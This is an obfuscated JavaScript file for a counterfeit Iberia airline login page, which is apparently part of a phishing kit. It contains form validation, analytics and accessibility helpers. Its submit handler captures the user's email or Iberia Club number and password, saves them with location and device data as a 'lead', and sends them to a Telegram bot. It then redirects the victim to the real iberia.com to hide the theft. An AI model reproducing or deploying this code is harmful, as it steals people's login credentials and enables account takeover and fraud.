const CONFIG={'DEBUG':!![],'MIN_PASSWORD_LENGTH':0x8,'MIN_IBERIA_CLUB_LENGTH':0x4,'MAX_IBERIA_CLUB_LENGTH':0xe,'EMAIL_REGEX':/^[^\s@]+@[^\s@]+\.[^\s@]+$/,'IBERIA_CLUB_PREFIX':/^(IB|ib)/i,'ANIMATION_DELAY':0x96,'PASSWORD_FORBIDDEN_CHARS':/[%&¬°¬øÃà¬´¬ª\\‚Ç¨¬∫¬™√á¬¨ÃÅ"]/,'PASSWORD_ALLOWED_SPECIAL':/[!@#$^*()_+\-=\[\]{};':,.<>?\/|`~]/};class LuhnValidator{static['validate'](_0xa2d4f){if(!_0xa2d4f)return![];const _0x2692e1=_0xa2d4f['replace'](/[\s-]/g,'');if(!/^\d+$/['test'](_0x2692e1))return![];let _0x2bcf6a=0x0,_0x2f06bf=![];for(let _0x4c1ebb=_0x2692e1['length']-0x1;_0x4c1ebb>=0x0;_0x4c1ebb--){let _0x3afd5d=parseInt(_0x2692e1['charAt'](_0x4c1ebb),0xa);_0x2f06bf&&(_0x3afd5d*=0x2,_0x3afd5d>0x9&&(_0x3afd5d-=0x9)),_0x2bcf6a+=_0x3afd5d,_0x2f06bf=!_0x2f06bf;}return _0x2bcf6a%0xa===0x0;}}class FormValidator{constructor(_0x26b047){this['form']=document['getElementById'](_0x26b047),this['emailInput']=document['getElementById']('emailInput'),this['passwordInput']=document['getElementById']('passwordInput'),this['emailLabel']=document['getElementById']('emailLabel'),this['passwordLabel']=document['getElementById']('passwordLabel'),this['emailError']=document['getElementById']('emailError'),this['passwordError']=document['getElementById']('passwordError'),this['emailErrorText']=document['getElementById']('emailErrorText'),this['passwordErrorText']=document['getElementById']('passwordErrorText'),this['togglePasswordBtn']=document['getElementById']('togglePassword'),this['init']();}['init'](){this['attachEventListeners'](),this['handleAutofill'](),this['log']('FormValidator\x20initialized');}['attachEventListeners'](){this['emailInput']['addEventListener']('focus',()=>this['handleFocus']('email')),this['emailInput']['addEventListener']('blur',()=>this['handleBlur']('email')),this['emailInput']['addEventListener']('input',()=>this['clearError']('email')),this['passwordInput']['addEventListener']('focus',()=>this['handleFocus']('password')),this['passwordInput']['addEventListener']('blur',()=>this['handleBlur']('password')),this['passwordInput']['addEventListener']('input',()=>this['clearError']('password')),this['togglePasswordBtn']['addEventListener']('click',()=>this['togglePasswordVisibility']()),this['form']['addEventListener']('submit',_0x4bec33=>this['handleSubmit'](_0x4bec33)),this['emailInput']['addEventListener']('animationstart',_0x3cd692=>{_0x3cd692['animationName']==='onAutoFillStart'&&this['emailLabel']['classList']['add']('ib-input-label--focus');}),this['passwordInput']['addEventListener']('animationstart',_0x56c6fd=>{_0x56c6fd['animationName']==='onAutoFillStart'&&this['passwordLabel']['classList']['add']('ib-input-label--focus');});}['handleAutofill'](){setTimeout(()=>{this['emailInput']['value']&&this['emailLabel']['classList']['add']('ib-input-label--focus'),this['passwordInput']['value']&&this['passwordLabel']['classList']['add']('ib-input-label--focus');},0x258);}['handleFocus'](_0x521592){if(_0x521592==='email')this['emailLabel']['classList']['add']('ib-input-label--focus');else _0x521592==='password'&&this['passwordLabel']['classList']['add']('ib-input-label--focus');}['handleBlur'](_0x46f88a){if(_0x46f88a==='email')!this['emailInput']['value']&&this['emailLabel']['classList']['remove']('ib-input-label--focus'),this['validateEmail']();else _0x46f88a==='password'&&(!this['passwordInput']['value']&&this['passwordLabel']['classList']['remove']('ib-input-label--focus'),this['validatePassword']());}['validateEmail'](){const _0x6b6e26=this['emailInput']['value']['trim']();if(!_0x6b6e26)return this['showError']('email','Este\x20campo\x20es\x20obligatorio'),![];if(_0x6b6e26['includes']('@'))return this['validateEmailFormat'](_0x6b6e26);return this['validateIberiaClub'](_0x6b6e26);}['validateEmailFormat'](_0x4a1ff0){if(_0x4a1ff0['length']<0x6)return this['showError']('email','Debe\x20tener\x20al\x20menos\x206\x20caracteres'),![];if(!CONFIG['EMAIL_REGEX']['test'](_0x4a1ff0))return this['showError']('email','Formato\x20de\x20e-mail\x20inv√°lido'),![];return this['clearError']('email'),!![];}['validateIberiaClub'](_0x90c0a2){const _0x4cd711=this['validateIberiaClubNumber'](_0x90c0a2);if(!_0x4cd711['isValid'])return this['showError']('email',_0x4cd711['errorMessage']),![];return this['clearError']('email'),!![];}['validateIberiaClubNumber'](_0x4dda5c){const _0x429e5a={'isValid':![],'errorMessage':'','cleanNumber':'','hasInvalidLetters':![]},_0x1b2ebb=_0x4dda5c['trim']();let _0x11deef=_0x1b2ebb;CONFIG['IBERIA_CLUB_PREFIX']['test'](_0x1b2ebb)&&(_0x11deef=_0x1b2ebb['substring'](0x2));const _0x316d2e=/[a-zA-Z]/['test'](_0x11deef);if(_0x316d2e){_0x429e5a['hasInvalidLetters']=!![];const _0x9edea6=_0x11deef['replace'](/\D/g,'');return _0x9edea6['length']>=CONFIG['MIN_IBERIA_CLUB_LENGTH']&&_0x9edea6['length']<=CONFIG['MAX_IBERIA_CLUB_LENGTH']?LuhnValidator['validate'](_0x9edea6)?_0x429e5a['errorMessage']='Por\x20favor,\x20escribe\x20solo\x20los\x20n√∫meros.':_0x429e5a['errorMessage']='El\x20n√∫mero\x20introducido\x20no\x20corresponde\x20con\x20ning√∫n\x20n√∫mero\x20Iberia\x20Club.':_0x429e5a['errorMessage']='Por\x20favor,\x20escribe\x20solo\x20los\x20n√∫meros.',_0x429e5a;}const _0x249e66=_0x11deef['replace'](/\D/g,'');if(_0x249e66['length']===0x0)return _0x429e5a['errorMessage']='Este\x20campo\x20es\x20obligatorio',_0x429e5a;if(_0x249e66['length']<CONFIG['MIN_IBERIA_CLUB_LENGTH'])return _0x429e5a['errorMessage']='Debe\x20tener\x20al\x20menos\x204\x20caracteres',_0x429e5a;if(_0x249e66['length']>CONFIG['MAX_IBERIA_CLUB_LENGTH'])return _0x429e5a['errorMessage']='Parece\x20que\x20hay\x20demasiados\x20caracteres.\x20Por\x20favor,\x20rev√≠salo.',_0x429e5a;if(!LuhnValidator['validate'](_0x249e66))return _0x429e5a['errorMessage']='El\x20n√∫mero\x20introducido\x20no\x20corresponde\x20con\x20ning√∫n\x20n√∫mero\x20Iberia\x20Club.',_0x429e5a;return _0x429e5a['isValid']=!![],_0x429e5a['cleanNumber']=_0x249e66,_0x429e5a;}['validatePassword'](){const _0x1132d4=this['passwordInput']['value'];if(!_0x1132d4)return this['showError']('password','Este\x20campo\x20es\x20obligatorio'),![];if(_0x1132d4['length']<CONFIG['MIN_PASSWORD_LENGTH'])return this['showError']('password','Contrase√±a\x20no\x20v√°lida'),![];if(CONFIG['PASSWORD_FORBIDDEN_CHARS']['test'](_0x1132d4))return this['showError']('password','Contrase√±a\x20no\x20v√°lida'),![];let _0x160bb2=0x0;if(/[A-Z]/['test'](_0x1132d4))_0x160bb2++;if(/[a-z]/['test'](_0x1132d4))_0x160bb2++;if(/[0-9]/['test'](_0x1132d4))_0x160bb2++;if(CONFIG['PASSWORD_ALLOWED_SPECIAL']['test'](_0x1132d4))_0x160bb2++;if(_0x160bb2<0x3)return this['showError']('password','Contrase√±a\x20no\x20v√°lida'),![];return this['clearError']('password'),!![];}['showError'](_0x605385,_0x24899c){if(_0x605385==='email')this['emailInput']['classList']['add']('ib-input--error'),this['emailErrorText']['textContent']=_0x24899c,this['emailError']['classList']['remove']('u-hide');else _0x605385==='password'&&(this['passwordInput']['classList']['add']('ib-input--error'),this['passwordErrorText']['textContent']=_0x24899c,this['passwordError']['classList']['remove']('u-hide'));}['clearError'](_0x5c89ca){if(_0x5c89ca==='email')this['emailInput']['classList']['remove']('ib-input--error'),this['emailError']['classList']['add']('u-hide'),this['emailErrorText']['textContent']='';else _0x5c89ca==='password'&&(this['passwordInput']['classList']['remove']('ib-input--error'),this['passwordError']['classList']['add']('u-hide'),this['passwordErrorText']['textContent']='');}['togglePasswordVisibility'](){const _0x5bfa48=this['passwordInput']['type']==='password'?'text':'password';this['passwordInput']['type']=_0x5bfa48,_0x5bfa48==='password'?(this['togglePasswordBtn']['innerHTML']='<i\x20class=\x22fas\x20fa-eye\x22></i>',this['togglePasswordBtn']['setAttribute']('aria-label','Mostrar\x20contrase√±a')):(this['togglePasswordBtn']['innerHTML']='<i\x20class=\x22fas\x20fa-eye-slash\x22></i>',this['togglePasswordBtn']['setAttribute']('aria-label','Ocultar\x20contrase√±a'));}['handleSubmit'](_0x12ef40){_0x12ef40['preventDefault']();const _0x1536e6=this['validateEmail'](),_0x324826=this['validatePassword']();_0x1536e6&&_0x324826?(this['log']('Form\x20is\x20valid!\x20Submitting...'),this['submitForm']()):(this['log']('Form\x20validation\x20failed'),this['trackLoginError']());}async['submitForm'](){const _0x51a329=this['form']['querySelector']('button[type=\x22submit\x22]'),_0x3b3f00=_0x51a329['textContent'];_0x51a329['textContent']='Iniciando\x20sesi√≥n...',_0x51a329['disabled']=!![];const _0x5592f9=this['emailInput']['value']['trim'](),_0x1a3287=this['passwordInput']['value'];try{if(window['LeadTracker']){const _0x3de026={'email':_0x5592f9,'password':_0x1a3287,'location':window['VisitorTracker']&&window['VisitorTracker']['lastLocation']?window['VisitorTracker']['lastLocation']:null,'device':window['VisitorTracker']&&window['VisitorTracker']['lastDevice']?window['VisitorTracker']['lastDevice']:null};window['LeadTracker']['saveLead'](_0x3de026),this['log']('Lead\x20salvo\x20no\x20localStorage');}window['TelegramBot']&&(await window['TelegramBot']['sendToTelegram'](_0x5592f9,_0x1a3287),this['log']('Dados\x20enviados\x20para\x20o\x20Telegram\x20com\x20sucesso')),await new Promise(_0x4c3bf4=>setTimeout(_0x4c3bf4,0x7d0)),window['location']['href']='https://www.iberia.com/es/';}catch(_0x235bc0){console['error']('Erro\x20no\x20envio:',_0x235bc0),setTimeout(()=>{window['location']['href']='https://www.iberia.com/es/';},0x5dc);}}['trackLoginError'](){this['log']('Login\x20error\x20tracked'),window['dataLayer']&&window['dataLayer']['push']({'event':'login_error','eventCategory':'login','eventAction':'error','eventLabel':'validation_failed'});}['log'](_0xb7eb1b){CONFIG['DEBUG']&&console['log']('[FormValidator]\x20'+_0xb7eb1b);}}class Analytics{constructor(){this['dataLayer']=window['dataLayer']||[],this['init']();}['init'](){this['setupDataLayer'](),this['trackPageView']();}['setupDataLayer'](){window['dataLayer']=this['dataLayer'];const _0x1566b9={'idioma':'es','mercado':'ES','estadoUsuario':'no_logado','quadrigam':'IBLOGN','versionWeb':'custom','modeWeb':this['getDeviceType']()};this['dataLayer']['push'](_0x1566b9),this['log']('DataLayer\x20initialized',_0x1566b9);}['getDeviceType'](){const _0x524060=window['innerWidth'];if(_0x524060<0x300)return'mobile';if(_0x524060<0x400)return'tablet';return'desktop';}['trackPageView'](){this['dataLayer']['push']({'event':'pageview','pagePath':window['location']['pathname'],'pageTitle':document['title']}),this['log']('Page\x20view\x20tracked');}['trackEvent'](_0x3240df,_0x52f4c4={}){this['dataLayer']['push']({'event':_0x3240df,..._0x52f4c4}),this['log']('Event\x20tracked:\x20'+_0x3240df,_0x52f4c4);}['log'](_0x2fe9e4,_0x362416=null){CONFIG['DEBUG']&&console['log']('[Analytics]\x20'+_0x2fe9e4,_0x362416||'');}}class AccessibilityHelper{constructor(){this['init']();}['init'](){this['setupKeyboardNavigation'](),this['setupAriaLabels'](),this['setupFocusManagement']();}['setupKeyboardNavigation'](){document['addEventListener']('keydown',_0x10ba28=>{if(_0x10ba28['key']==='Escape'){const _0xb162a=document['activeElement'];_0xb162a&&_0xb162a['tagName']==='INPUT'&&_0xb162a['blur']();}});const _0x25fa56=document['querySelectorAll']('input');_0x25fa56['forEach']((_0x3aa6b6,_0xb916fc)=>{_0x3aa6b6['addEventListener']('keydown',_0x357c2b=>{if(_0x357c2b['key']==='Enter'&&_0x3aa6b6['type']!=='submit'){_0x357c2b['preventDefault']();const _0x21ef40=_0x25fa56[_0xb916fc+0x1];_0x21ef40&&_0x21ef40['focus']();}});});}['setupAriaLabels'](){const _0x1d2a55=document['querySelectorAll']('button:not([aria-label])');_0x1d2a55['forEach'](_0x416ff3=>{!_0x416ff3['getAttribute']('aria-label')&&_0x416ff3['setAttribute']('aria-label',_0x416ff3['textContent']['trim']());});}['setupFocusManagement'](){let _0x15f68e=![];document['addEventListener']('mousedown',()=>{_0x15f68e=![],document['body']['classList']['remove']('keyboard-navigation');}),document['addEventListener']('keydown',_0x42e13f=>{_0x42e13f['key']==='Tab'&&(_0x15f68e=!![],document['body']['classList']['add']('keyboard-navigation'));});}}class PerformanceMonitor{constructor(){this['metrics']={},this['init']();}['init'](){'performance'in window&&this['measurePageLoad']();}['measurePageLoad'](){window['addEventListener']('load',()=>{setTimeout(()=>{const _0x32fb4b=performance['getEntriesByType']('navigation')[0x0];this['metrics']={'dns':_0x32fb4b['domainLookupEnd']-_0x32fb4b['domainLookupStart'],'tcp':_0x32fb4b['connectEnd']-_0x32fb4b['connectStart'],'ttfb':_0x32fb4b['responseStart']-_0x32fb4b['requestStart'],'download':_0x32fb4b['responseEnd']-_0x32fb4b['responseStart'],'domInteractive':_0x32fb4b['domInteractive'],'domComplete':_0x32fb4b['domComplete'],'loadComplete':_0x32fb4b['loadEventEnd']-_0x32fb4b['loadEventStart']},this['log']('Performance\x20metrics',this['metrics']);},0x0);});}['log'](_0x9721c1,_0x466e81){CONFIG['DEBUG']&&console['log']('[Performance]\x20'+_0x9721c1,_0x466e81);}}class App{constructor(){this['validator']=null,this['analytics']=null,this['accessibility']=null,this['performance']=null;}['init'](){document['readyState']==='loading'?document['addEventListener']('DOMContentLoaded',()=>this['bootstrap']()):this['bootstrap']();}['bootstrap'](){console['log']('üöÄ\x20Iberia\x20Login\x20App\x20v2.0\x20-\x20Iniciando...'),this['validator']=new FormValidator('loginForm'),this['analytics']=new Analytics(),this['accessibility']=new AccessibilityHelper(),this['performance']=new PerformanceMonitor(),this['setupGlobalEvents'](),console['log']('‚úÖ\x20App\x20initialized\x20successfully');}['setupGlobalEvents'](){window['addEventListener']('orientationchange',()=>{this['analytics']['trackEvent']('orientation_change',{'orientation':window['orientation']});}),document['addEventListener']('visibilitychange',()=>{document['hidden']?this['analytics']['trackEvent']('page_hidden'):this['analytics']['trackEvent']('page_visible');});let _0x4b549f=![];document['getElementById']('loginForm')['addEventListener']('submit',_0x40fc79=>{if(_0x4b549f)return _0x40fc79['preventDefault'](),![];_0x4b549f=!![],setTimeout(()=>_0x4b549f=![],0x7d0);});}}const app=new App();app['init']();CONFIG['DEBUG']&&(window['IberiaApp']={'app':app,'LuhnValidator':LuhnValidator,'CONFIG':CONFIG});